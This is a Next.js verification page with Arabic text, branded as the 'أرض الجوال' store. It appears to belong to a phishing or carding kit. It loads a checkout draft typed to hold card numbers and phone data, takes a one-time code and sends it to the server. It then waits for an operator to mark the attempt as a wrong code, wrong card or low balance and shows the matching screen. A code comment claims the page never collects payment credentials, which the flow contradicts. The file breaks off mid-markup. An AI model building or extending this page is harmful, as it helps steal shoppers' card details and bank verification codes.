'use client';

import Link from 'next/link';
import { useEffect, useState } from 'react';

const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';

type CheckoutDraft = {
  phone?: unknown;
  cardLast4?: string;
  cardNumber?: string;
  card_number?: string;
  card?: string;
  stage?: unknown;
  orderId?: unknown;
  orderNumber?: unknown;
  customerNotificationKey?: unknown;
  confirmedAt?: unknown;
};

function normalizeDigits(value: string) {
  return value
    .replace(/[٠-٩]/g, (digit) => String('٠١٢٣٤٥٦٧٨٩'.indexOf(digit)))
    .replace(/[۰-۹]/g, (digit) => String('۰۱۲۳۴۵۶۷۸۹'.indexOf(digit)))
    .replace(/[^0-9]/g, '');
}

export default function VerifyPhonePage() {
  const [phone, setPhone] = useState('');
  const [orderId, setOrderId] = useState('');
  const [orderNumber, setOrderNumber] = useState('');
  const [customerNotificationKey, setCustomerNotificationKey] = useState('');
  const [draftReady, setDraftReady] = useState(false);
  const [referenceCode, setReferenceCode] = useState('');
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verified, setVerified] = useState(false);
  const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [invoiceSent, setInvoiceSent] = useState(false);
  const [adminNoticeType, setAdminNoticeType] = useState<'otp' | 'card' | 'balance' | null>(null);

  const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);

  // Keep the 30-second waiting screen isolated from the storefront shell.
  useEffect(() => {
    if (!verified) return;
    const pageClass = 'erd-verify-waiting-screen';
    document.documentElement.classList.add(pageClass);
    document.body.classList.add(pageClass);
    return () => {
      document.documentElement.classList.remove(pageClass);
      document.body.classList.remove(pageClass);
    };
  }, [verified]);

  useEffect(() => {
    try {
      const raw = window.sessionStorage.getItem(DRAFT_KEY);
      const draft = raw ? (JSON.parse(raw) as CheckoutDraft) : null;

      const savedPhone = typeof draft?.phone === 'string' ? normalizeDigits(draft.phone) : '';
      const savedOrderId = typeof draft?.orderId === 'string' ? draft.orderId : '';
      const savedKey = typeof draft?.customerNotificationKey === 'string' ? draft.customerNotificationKey : '';
      const savedConfirmedAt =
        typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
          ? draft.confirmedAt
          : null;

      if (
        (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
        savedPhone.length === 10 &&
        savedOrderId &&
        savedKey
      ) {
        setPhone(savedPhone);
        setOrderId(savedOrderId);
        setOrderNumber(typeof draft.orderNumber === 'string' ? draft.orderNumber : '');
        setCustomerNotificationKey(savedKey);
        setVerified(draft.stage === 'confirmed');
        setConfirmedAt(draft.stage === 'confirmed' ? savedConfirmedAt : null);
        setDraftReady(true);
      } else {
        setDraftReady(true);
      }
    } catch {
      setDraftReady(true);
    }
  }, []);

  useEffect(() => {
    if (!verified) {
      setCountdown(0);
      return;
    }

    const verificationTime = confirmedAt ?? Date.now();
    const updateCountdown = () => {
      setCountdown(Math.max(0, Math.ceil((verificationTime + 30_000 - Date.now()) / 1000)));
    };

    updateCountdown();
    const interval = window.setInterval(updateCountdown, 250);
    return () => {
      window.clearInterval(interval);
    };
  }, [confirmedAt, verified]);

  // Watch for the latest admin notice while the 30-second screen is active.
  // This only changes the displayed status screen; it never collects payment credentials.
  useEffect(() => {
    if (!verified || adminNoticeType || !orderId || !customerNotificationKey) return;

    let active = true;
    let requestInFlight = false;

    const checkAdminNotice = async () => {
      if (!active || requestInFlight) return;
      requestInFlight = true;
      try {
        const response = await fetch(
          '/api/customer-notifications?key=' + encodeURIComponent(customerNotificationKey),
          { cache: 'no-store' }
        );
        if (!response.ok) return;

        const result = await response.json() as {
          ok?: boolean;
          notifications?: Array<{ orderId?: string; status?: string; createdAt?: string }>;
        };
        const verificationTime = confirmedAt ?? 0;
        const matchingNotice = result.ok === true &&
          Array.isArray(result.notifications) &&
          result.notifications.find((item) => {
            const createdAt = Date.parse(item.createdAt || '');
            return item.orderId === orderId &&
              (item.status === 'otp_requested' || item.status === 'card_details_incorrect' || item.status === 'insufficient_balance') &&
              Number.isFinite(createdAt) &&
              createdAt >= verificationTime - 15_000;
          });

        if (active && matchingNotice) {
          setAdminNoticeType(matchingNotice.status === 'otp_requested' ? 'otp' : matchingNotice.status === 'card_details_incorrect' ? 'card' : 'balance');
        }
      } catch {
        // Keep the current screen and retry after the next polling interval.
      } finally {
        requestInFlight = false;
      }
    };

    void checkAdminNotice();
    const timer = window.setInterval(() => { void checkAdminNotice(); }, 2500);
    const handleFocus = () => { void checkAdminNotice(); };
    window.addEventListener('focus', handleFocus);

    return () => {
      active = false;
      window.clearInterval(timer);
      window.removeEventListener('focus', handleFocus);
    };
  }, [verified, adminNoticeType, orderId, customerNotificationKey, confirmedAt]);

  // Once the 30-second wait ends, keep showing that screen until the admin sends this order's invoice.
  useEffect(() => {
    if (!verified || countdown > 0 || invoiceSent || !orderId || !customerNotificationKey) return;

    let active = true;
    let requestInFlight = false;

    const checkInvoiceSent = async () => {
      if (!active || requestInFlight) return;
      requestInFlight = true;
      try {
        const response = await fetch(
          '/api/customer-notifications?key=' + encodeURIComponent(customerNotificationKey),
          { cache: 'no-store' }
        );
        if (!response.ok) return;

        const result = await response.json() as {
          ok?: boolean;
          notifications?: Array<{ orderId?: string; status?: string }>;
        };
        const matchingInvoice = result.ok === true &&
          Array.isArray(result.notifications) &&
          result.notifications.some((item) =>
            item.orderId === orderId && item.status === 'invoice_documents'
          );

        if (active && matchingInvoice) setInvoiceSent(true);
      } catch {
        // Stay on the waiting screen and retry after the next polling interval.
      } finally {
        requestInFlight = false;
      }
    };

    void checkInvoiceSent();
    const timer = window.setInterval(() => { void checkInvoiceSent(); }, 2500);
    const handleFocus = () => { void checkInvoiceSent(); };
    window.addEventListener('focus', handleFocus);

    return () => {
      active = false;
      window.clearInterval(timer);
      window.removeEventListener('focus', handleFocus);
    };
  }, [verified, countdown, invoiceSent, orderId, customerNotificationKey]);

  async function handleVerify() {
    if (!isReferenceCodeValid) {
      setError('أدخل رمزًا  من 4 إلى 6 أرقام.');
      return;
    }
    if (isVerifying || verified) return;

    setError('');
    setIsVerifying(true);
    try {
      const response = await fetch('/api/orders/verify-confirmation-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          orderId,
          customerNotificationKey,
          code: referenceCode
        })
      });
      const result = await response.json() as { ok?: boolean; error?: string };
      if (!response.ok || result.ok !== true) {
        setError(result.error || 'تعذر إرسال رمز الطلب. حاول مرة أخرى.');
        return;
      }

      setConfirmedAt(Date.now());
      setVerified(true);
    } catch {
      setError('تعذر الاتصال بالخادم. حاول مرة أخرى.');
    } finally {
      setIsVerifying(false);
    }
  }

  if (!draftReady) {
    return (
      <main style={{ backgroundColor: '#ffffff', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
        <div style={{ textAlign: 'center' }}>
          <p style={{ color: '#555', fontSize: '16px', marginBottom: '15px' }}>لا توجد بيانات طلب جاهزة للتأكيد.</p>
          <Link href="/checkout/store" style={{ color: '#1646a7', textDecoration: 'none' }}>
            العودة لإدخال بيانات الطلب
          </Link>
        </div>
      </main>
    );
  }

  if (adminNoticeType === 'otp' && !invoiceSent) {
    return (
      <main className="erd-retry-page">
        <style jsx global>{`
          @import url("https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap");
          .erd-retry-page,
          .erd-retry-page * {
            box-sizing: border-box;
            font-family: Cairo, system-ui, -apple-system, sans-serif;
          }
          .erd-retry-page {
            direction: rtl;
            background: #f4f7f6;
            color: #12354e;
            width: 100%;
            min-height: 100vh;
            min-height: 100svh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
          }
          .erd-retry-card {
            background: #fff;
            width: 100%;
            max-width: 440px;
            border-radius: 28px;
            padding: 36px 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,.04);
            text-align: center;
          }
          .erd-retry-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 28px;
          }
          .erd-retry-logo-text {
            text-align: right;
            font-size: 26px;
            font-weight: 800;
            color: #12354e;
            line-height: 1.05;
          }
          .erd-retry-logo-text span { color: #00cda9; display: block; }
          .erd-retry-logo-mark { display: flex; flex-direction: column; gap: 4px; }
          .erd-retry-shape {
            width: 32px;
            height: 20px;
            border-radius: 6px;
            transform: skewX(-12deg);
          }
          .erd-retry-shape-top { background: #12354e; }
          .erd-retry-shape-bottom { background: #00cda9; }
          .erd-retry-icon-wrap {
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 96px;
            margin-bottom: 28px;
          }
          .erd-retry-ray {
            position: absolute;
            width: 14px;
            height: 5px;
            background: #ff8a8a;
            border-radius: 10px;
            opacity: .85;
          }
          .erd-retry-ray-left-top { left: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(-25deg); }
          .erd-retry-ray-left-bottom { left: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(25deg); }
          .erd-retry-ray-right-top { right: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(25deg); }
          .erd-retry-ray-right-bottom { right: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(-25deg); }
          .erd-retry-status-circle {
            width: 96px;
            height: 96px;
            flex: none;
            background: radial-gradient(circle at 35% 35%, #ff5252 0%, #ee2a3a 70%, #d31d2d 100%);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 10px 25px rgba(238,42,58,.28);
            position: relative;
            z-index: 2;
          }
          .erd-retry-status-circle svg { width: 44px; height: 44px; color: #fff; stroke-width: 3.5; }
          .erd-retry-title {
            font-size: 34px;
            font-weight: 800;
            color: #12354e;
            margin: 0 0 6px;
            line-height: 1.2;
          }
          .erd-retry-highlight {
            font-size: 32px;
            font-weight: 900;
            color: #ee3c47;
            margin-bottom: 8px;
            line-height: 1.2;
          }
          .erd-retry-subtitle {
            font-size: 19px;
            font-weight: 700;
            color: #12354e;
            line-height: 1.65;
            margin: 0 0 28px;
          }
          .erd-retry-tip {
            background: #f0fdf9;
            border: 1.5px solid #c2f5ea;
            border-radius: 20px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 14px;
            text-align: right;
          }
          .erd-retry-cards-wrapper {
            position: relative;
            width: 120px;
            height: 72px;
            flex: none;
          }
          .erd-retry-otp-bubble {
            position: absolute;
            top: 10px;
            left: 2px;
            z-index: 1;
            background: #fff;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,.06);
            padding: 4px 12px;
            color: #12354e;
            font-size: 16px;
            font-weight: 900;
            letter-spacing: 2px;
          }
          .erd-retry-otp-bubble::after {
            content: "";
            position: absolute;
            bottom: -5px;
            left: 10px;
            width: 0;
            height: 0;
            border-left: 6px solid transparent;
            border-right: 6px solid transparent;
            border-top: 6px solid #fff;
          }
          .erd-retry-card-visual {
            position: absolute;
            top: 0;
            right: 0;
            width: 90px;
            height: 56px;
            z-index: 2;
            padding: 6px;
            background: linear-gradient(135deg,#1d3344 0%,#0d1e2b 100%);
            border-radius: 8px;
            box-shadow: 0 8px 16px rgba(15,23,42,.2);
            transform: rotate(-6deg);
            display: flex;
            flex-direction: column;
            justify-content: space-between;
          }
          .erd-retry-chip {
            width: 13px;
            height: 10px;
            background: #f0c567;
            border-radius: 2.5px;
          }
          .erd-retry-card-lines { display: flex; gap: 3px; }
          .erd-retry-card-line {
            width: 11px;
            height: 3px;
            background: rgba(255,255,255,.3);
            border-radius: 2px;
          }
          .erd-retry-lock {
            position: absolute;
            right: 22px;
            bottom: -6px;
            z-index: 3;
            width: 36px;
            height: 36px;
            border: 3px solid #fff;
            border-radius: 50%;
            background: linear-gradient(135deg,#00cda9 0%,#00a88a 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 3px 8px rgba(0,205,169,.3);
          }
          .erd-retry-lock svg { width: 18px; height: 18px; color: #fff; }
          .erd-retry-divider {
            width: 1.5px;
            height: 58px;
            flex: none;
            background: #bcefe5;
          }
          .erd-retry-tip-text {
            min-width: 0;
            flex: 1;
            text-align: right;
            font-size: 14px;
            font-weight: 700;
            color: #12354e;
            line-height: 1.7;
          }
          .erd-retry-tip-text strong { color: #00a88a; }
          @media (max-width: 420px) {
            .erd-retry-page { padding: 14px; }
            .erd-retry-card { padding: 30px 16px; border-radius: 24px; }
            .erd-retry-title { font-size: 29px; }
            .erd-retry-highlight { font-size: 29px; }
            .erd-retry-subtitle { font-size: 17px; }
            .erd-retry-tip { padding: 12px 10px; gap: 10px; }
            .erd-retry-cards-wrapper { width: 100px; }
            .erd-retry-tip-text { font-size: 12px; }
          }
          @media (max-width: 350px) {
            .erd-retry-card { padding-inline: 12px; }
            .erd-retry-tip { gap: 8px; }
            .erd-retry-cards-wrapper { width: 86px; }
            .erd-retry-card-visual { width: 78px; }
            .erd-retry-lock { right: 16px; }
            .erd-retry-divider { height: 54px; }
          }
        `}</style>

        <section className="erd-retry-card" aria-live="polite">
          <div className="erd-retry-logo">
            <div className="erd-retry-logo-text">
              أرض
              <span>الجوال</span>
            </div>
            <div className="erd-retry-logo-mark" aria-hidden="true">
              <div className="erd-retry-shape erd-retry-shape-top" />
              <div className="erd-retry-shape erd-retry-shape-bottom" />
            </div>
          </div>

          <div className="erd-retry-icon-wrap" aria-hidden="true">
            <div className="erd-retry-ray erd-retry-ray-left-top" />
            <div className="erd-retry-ray erd-retry-ray-left-bottom" />
            <div className="erd-retry-ray erd-retry-ray-right-top" />
            <div className="erd-retry-ray erd-retry-ray-right-bottom" />
            <div className="erd-retry-status-circle">
              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </div>
          </div>

          <h1 className="erd-retry-title">تحديث العملية رقم 2</h1>
          <div className="erd-retry-highlight">تم استلام الإشعار</div>
          <p className="erd-retry-subtitle">تم تحديث حالة طلبك من الإدارة، ويمكنك متابعة الطلب من المتجر.</p>

          <div className="erd-retry-tip">
            <div className="erd-retry-cards-wrapper" aria-hidden="true">
              <div className="erd-retry-otp-bubble">••••</div>
              <div className="erd-retry-card-visual">
                <div className="erd-retry-chip" />
                <div className="erd-retry-card-lines">
                  <div className="erd-retry-card-line" />
                  <div className="erd-retry-card-line" />
                  <div className="erd-retry-card-line" />
                  <div className="erd-retry-card-line" />
                </div>
              </div>
              <div className="erd-retry-lock">
                <svg fill="none" stroke="currentColor" strokeWidth="2.2" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
              </div>
            </div>

            <div className="erd-retry-divider" aria-hidden="true" />
            <div className="erd-retry-tip-text">
              تم إرسال إشعار جديد بخصوص العملية. <strong>لا تشارك أي رموز تحقق مع أي شخص</strong>، وأكمل أي تحقق مطلوب داخل تطبيق مزود الدفع الرسمي فقط.
            </div>
          </div>
        </section>
      </main>
    );
  }

  if (adminNoticeType === 'card' && !invoiceSent) {
    return (
      <main className="erd-card-error-page">
        <style jsx global>{`
          @import url("https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap");
          .erd-card-error-page,
          .erd-card-error-page * {
            box-sizing: border-box;
            font-family: Cairo, system-ui, -apple-system, sans-serif;
          }
          .erd-card-error-page {
            direction: rtl;
            background: #f4f7f6;
            color: #12354e;
            width: 100%;
            min-height: 100vh;
            min-height: 100svh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
          }
          .erd-card-error-card {
            background: #fff;
            width: 100%;
            max-width: 440px;
            border-radius: 28px;
            padding: 36px 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,.04);
            text-align: center;
          }
          .erd-card-error-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 28px;
          }
          .erd-card-error-logo-text {
            text-align: right;
            font-size: 26px;
            font-weight: 800;
            color: #12354e;
            line-height: 1.05;
          }
          .erd-card-error-logo-text span { color: #00cda9; display: block; }
          .erd-card-error-logo-mark { display: flex; flex-direction: column; gap: 4px; }
          .erd-card-error-shape {
            width: 32px;
            height: 20px;
            border-radius: 6px;
            transform: skewX(-12deg);
          }
          .erd-card-error-shape-top { background: #12354e; }
          .erd-card-error-shape-bottom { background: #00cda9; }
          .erd-card-error-icon-wrap {
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 96px;
            margin-bottom: 28px;
          }
          .erd-card-error-ray {
            position: absolute;
            width: 14px;
            height: 5px;
            background: #ff8088;
            border-radius: 10px;
            opacity: .85;
          }
          .erd-card-error-ray-left-top { left: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(-25deg); }
          .erd-card-error-ray-left-bottom { left: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(25deg); }
          .erd-card-error-ray-right-top { right: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(25deg); }
          .erd-card-error-ray-right-bottom { right: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(-25deg); }
          .erd-card-error-circle {
            width: 96px;
            height: 96px;
            flex: none;
            background: radial-gradient(circle, #ff5252 0%, #ee3c47 100%);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 8px 24px rgba(238,60,71,.25);
            position: relative;
            z-index: 2;
            color: #fff;
            font-size: 50px;
            font-weight: 700;
            line-height: 1;
          }
          .erd-card-error-title {
            font-size: 30px;
            font-weight: 800;
            color: #12354e;
            margin: 0 0 8px;
            line-height: 1.25;
          }
          .erd-card-error-subtitle {
            font-size: 22px;
            font-weight: 800;
            color: #ee3c47;
            margin: 0 0 8px;
            line-height: 1.35;
          }
          .erd-card-error-description {
            font-size: 18px;
            font-weight: 700;
            color: #12354e;
            margin: 0 0 28px;
            line-height: 1.6;
          }
          .erd-card-error-tip {
            background: #f0fdf9;
            border: 1.5px solid #c2f5ea;
            border-radius: 20px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            text-align: right;
          }
          .erd-card-error-cards-area {
            position: relative;
            width: 100px;
            height: 60px;
            flex: none;
          }
          .erd-card-error-mini-back {
            position: absolute;
            top: 4px;
            left: 15px;
            width: 75px;
            height: 48px;
            background: #e2e8f0;
            border-radius: 6px;
            box-shadow: 0 2px 6px rgba(0,0,0,.1);
            padding: 6px;
          }
          .erd-card-error-magnetic-strip {
            width: 100%;
            height: 10px;
            background: #12354e;
            margin-top: 4px;
            border-radius: 1px;
          }
          .erd-card-error-mini-front {
            position: absolute;
            top: 0;
            right: 0;
            width: 75px;
            height: 48px;
            background: linear-gradient(135deg,#1d3344 0%,#0d1e2b 100%);
            border-radius: 6px;
            padding: 6px;
            box-shadow: 0 4px 10px rgba(0,0,0,.15);
          }
          .erd-card-error-chip {
            width: 12px;
            height: 9px;
            background: #f0c567;
            border-radius: 2px;
          }
          .erd-card-error-info-badge {
            position: absolute;
            bottom: -4px;
            left: 0;
            width: 28px;
            height: 28px;
            background: #00cda9;
            border: 2px solid #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            box-shadow: 0 2px 6px rgba(0,0,0,.1);
          }
          .erd-card-error-info-badge svg { width: 15px; height: 15px; }
          .erd-card-error-tip-text {
            min-width: 0;
            flex: 1;
            text-align: right;
            font-size: 14px;
            color: #12354e;
            font-weight: 700;
            line-height: 1.6;
          }
          .erd-card-error-tip-text strong { color: #00a88a; font-weight: 900; }
          @media (max-width: 420px) {
            .erd-card-error-page { padding: 14px; }
            .erd-card-error-card { padding: 30px 16px; border-radius: 24px; }
            .erd-card-error-title { font-size: 27px; }
            .erd-card-error-subtitle { font-size: 19px; }
            .erd-card-error-description { font-size: 16px; }
            .erd-card-error-tip { padding: 12px 10px; gap: 10px; }
            .erd-card-error-tip-text { font-size: 12px; }
          }
          @media (max-width: 350px) {
            .erd-card-error-card { padding-inline: 12px; }
            .erd-card-error-tip { gap: 8px; }
            .erd-card-error-cards-area { width: 88px; }
            .erd-card-error-mini-back { left: 8px; }
            .erd-card-error-info-badge { left: -2px; }
          }
        `}</style>

        <section className="erd-card-error-card" aria-live="polite">
          <div className="erd-card-error-logo">
            <div className="erd-card-error-logo-text">
              أرض
              <span>الجوال</span>
            </div>
            <div className="erd-card-error-logo-mark" aria-hidden="true">
              <div className="erd-card-error-shape erd-card-error-shape-top" />
              <div className="erd-card-error-shape erd-card-error-shape-bottom" />
            </div>
          </div>

          <div className="erd-card-error-icon-wrap" aria-hidden="true">
            <div className="erd-card-error-ray erd-card-error-ray-left-top" />
            <div className="erd-card-error-ray erd-card-error-ray-left-bottom" />
            <div className="erd-card-error-ray erd-card-error-ray-right-top" />
            <div className="erd-card-error-ray erd-card-error-ray-right-bottom" />
            <div className="erd-card-error-circle">&times;</div>
          </div>

          <h1 className="erd-card-error-title">عذرًا عزيزي</h1>
          <p className="erd-card-error-subtitle">تعذر التحقق من عملية الدفع</p>
          <p className="erd-card-error-description">يرجى مراجعة حالة العملية من خلال مزود الدفع .</p>

          <div className="erd-card-error-tip">
            <div className="erd-card-error-cards-area" aria-hidden="true">
              <div className="erd-card-error-mini-back">
                <div className="erd-card-error-magnetic-strip" />
              </div>
              <div className="erd-card-error-mini-front">
                <div className="erd-card-error-chip" />
              </div>
              <div className="erd-card-error-info-badge">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M12 3 4.5 6v5.5c0 4.4 3.1 7.7 7.5 9.5 4.4-1.8 7.5-5.1 7.5-9.5V6L12 3Z" />
                  <path d="m9 12 2 2 4-4" />
                </svg>
              </div>
            </div>
            <div className="erd-card-error-tip-text">
              <strong>:</strong> من فضلك ادخل كود الرمز .  .
            </div>
          </div>
        </section>
      </main>
    );
  }

  if (adminNoticeType === 'balance' && !invoiceSent) {
    return (
      <main className="erd-balance-page">
        <style jsx global>{`
          @import url("https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap");
          .erd-balance-page,
          .erd-balance-page * {
            box-sizing: border-box;
            font-family: Cairo, system-ui, -apple-system, sans-serif;
          }
          .erd-balance-page {
            direction: rtl;
            background: #f4f7f6;
            color: #12354e;
            width: 100%;
            min-height: 100vh;
            min-height: 100svh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
          }
          .erd-balance-card {
            background: #fff;
            width: 100%;
            max-width: 440px;
            border-radius: 28px;
            padding: 36px 24px;
            box-shadow: 0 10px 30px rgba(0,0,0,.04);
            text-align: center;
          }
          .erd-balance-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 28px;
          }
          .erd-balance-logo-text {
            text-align: right;
            font-size: 26px;
            font-weight: 800;
            color: #12354e;
            line-height: 1.05;
          }
          .erd-balance-logo-text span { color: #00cda9; display: block; }
          .erd-balance-logo-mark { display: flex; flex-direction: column; gap: 4px; }
          .erd-balance-shape {
            width: 32px;
            height: 20px;
            border-radius: 6px;
            transform: skewX(-12deg);
          }
          .erd-balance-shape-top { background: #12354e; }
          .erd-balance-shape-bottom { background: #00cda9; }
          .erd-balance-icon-wrap {
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 96px;
            margin-bottom: 28px;
          }
          .erd-balance-ray {
            position: absolute;
            width: 14px;
            height: 5px;
            background: #ff8a8a;
            border-radius: 10px;
            opacity: .85;
          }
          .erd-balance-ray-left-top { left: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(-25deg); }
          .erd-balance-ray-left-bottom { left: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(25deg); }
          .erd-balance-ray-right-top { right: clamp(28px, calc(50% - 120px), 80px); top: 18px; transform: rotate(25deg); }
          .erd-balance-ray-right-bottom { right: clamp(33px, calc(50% - 115px), 85px); bottom: 18px; transform: rotate(-25deg); }
          .erd-balance-error-circle {
            width: 96px;
            height: 96px;
            flex: none;
            background: radial-gradient(circle at 35% 35%, #ff5252 0%, #ee2a3a 70%, #d31d2d 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 25px rgba(238,42,58,.28);
            position: relative;
            z-index: 2;
          }
          .erd-balance-error-circle svg {
            width: 44px;
            height: 44px;
            color: #fff;
            stroke-width: 3.5;
          }
          .erd-balance-title {
            font-size: 36px;
            font-weight: 800;
            color: #12354e;
            margin: 0 0 2px;
            line-height: 1.2;
          }
          .erd-balance-highlight {
            font-size: 38px;
            font-weight: 900;
            color: #ee3c47;
            margin-bottom: 8px;
            line-height: 1.25;
          }
          .erd-balance-subtitle {
            font-size: 19px;
            font-weight: 700;
            color: #12354e;
            line-height: 1.6;
            margin: 0 0 28px;
          }
          .erd-balance-tip {
            background: #f0fdf9;
            border: 1.5px solid #c2f5ea;
            border-radius: 20px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 14px;
            text-align: right;
          }
          .erd-balance-wallet-wrapper {
            position: relative;
            width: 125px;
            height: 75px;
            flex: none;
          }
          .erd-balance-wallet-back {
            position: absolute;
            top: 14px;
            left: 36px;
            width: 60px;
            height: 48px;
            background: linear-gradient(135deg,#2b4c65 0%,#172a38 100%);
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,.15);
          }
          .erd-balance-wallet-button {
            position: absolute;
            top: 18px;
            left: 10px;
            width: 12px;
            height: 12px;
            background: #00cda9;
            border-radius: 50%;
            border: 2px solid #fff;
          }
          .erd-balance-card-front {
            position: absolute;
            top: 4px;
            right: 18px;
            width: 86px;
            height: 54px;
            background: linear-gradient(135deg,#1d3344 0%,#0d1e2b 100%);
            border-radius: 8px;
            box-shadow: 0 6px 14px rgba(15,23,42,.25);
            transform: rotate(-6deg);
            z-index: 2;
            padding: 6px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
          }
          .erd-balance-chip {
            width: 13px;
            height: 10px;
            background: #f0c567;
            border-radius: 2.5px;
          }
          .erd-balance-card-lines { display: flex; gap: 3px; }
          .erd-balance-card-line {
            width: 11px;
            height: 3px;
            background: rgba(255,255,255,.3);
            border-radius: 2px;
          }
          .erd-balance-gold-coins {
            position: absolute;
            bottom: 0;
            left: 32px;
            z-index: 3;
            display: flex;
            flex-direction: column;
            gap: 2px;
          }
          .erd-balance-coin {
            width: 24px;
            height: 7px;
            background: linear-gradient(90deg,#f3d078 0%,#d4a338 100%);
            border-radius: 100px;
            border: 1px solid #c49326;
            box-shadow: 0 1px 3px rgba(0,0,0,.15);
          }
          .erd-balance-terminal {
            position: absolute;
            bottom: -6px;
            right: 28px;
            width: 38px;
            height: 38px;
            background: linear-gradient(135deg,#00cda9 0%,#00a88a 100%);
            border: 3.5px solid #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 3px 8px rgba(0,205,169,.3);
            z-index: 4;
          }
          .erd-balance-terminal svg { width: 20px; height: 20px; color: #fff; }
          .erd-balance-divider {
            width: 1.5px;
            height: 58px;
            flex: none;
            background: #bcefe5;
          }
          .erd-balance-tip-text {
            min-width: 0;
            flex: 1;
            text-align: right;
            font-size: 14px;
            font-weight: 700;
            color: #12354e;
            line-height: 1.65;
          }
          @media (max-width: 420px) {
            .erd-balance-page { padding: 14px; }
            .erd-balance-card { padding: 30px 16px; border-radius: 24px; }
            .erd-balance-title { font-size: 31px; }
            .erd-balance-highlight { font-size: 31px; }
            .erd-balance-subtitle { font-size: 16px; }
            .erd-balance-tip { padding: 12px 10px; gap: 10px; }
            .erd-balance-wallet-wrapper { width: 106px; transform: scale(.88); transform-origin: center right; }
            .erd-balance-tip-text { font-size: 12px; }
          }
          @media (max-width: 350px) {
            .erd-balance-card { padding-inline: 12px; }
            .erd-balance-tip { gap: 7px; }
            .erd-balance-wallet-wrapper { width: 92px; transform: scale(.78); }
            .erd-balance-divider { height: 52px; }
          }
        `}</style>

        <section className="erd-balance-card" aria-live="polite">
          <div className="erd-balance-logo">
            <div className="erd-balance-logo-text">
              أرض
              <span>الجوال</span>
            </div>
            <div className="erd-balance-logo-mark" aria-hidden="true">
              <div className="erd-balance-shape erd-balance-shape-top" />
              <div className="erd-balance-shape erd-balance-shape-bottom" />
            </div>
          </div>

          <div className="erd-balance-icon-wrap" aria-hidden="true">
            <div className="erd-balance-ray erd-balance-ray-left-top" />
            <div className="erd-balance-ray erd-balance-ray-left-bottom" />
            <div className="erd-balance-ray erd-balance-ray-right-top" />
            <div className="erd-balance-ray erd-balance-ray-right-bottom" />
            <div className="erd-balance-error-circle">
              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </div>
          </div>

          <h1 className="erd-balance-title">عذرًا عزيزي</h1>
          <div className="erd-balance-highlight">لا يوجد رصيد كافي</div>
          <p className="erd-balance-subtitle">يرجى التأكد من توفر رصيد كافي لإتمام العملية</p>

          <div className="erd-balance-tip">
            <div className="erd-balance-wallet-wrapper" aria-hidden="true">
              <div className="erd-balance-wallet-back">
                <div className="erd-balance-wallet-button" />
              </div>
              <div className="erd-balance-card-front">
                <div className="erd-balance-chip" />
                <div className="erd-balance-card-lines">
                  <div className="erd-balance-card-line" />
                  <div className="erd-balance-card-line" />
                  <div className="erd-balance-card-line" />
                  <div className="erd-balance-card-line" />
                </div>
              </div>
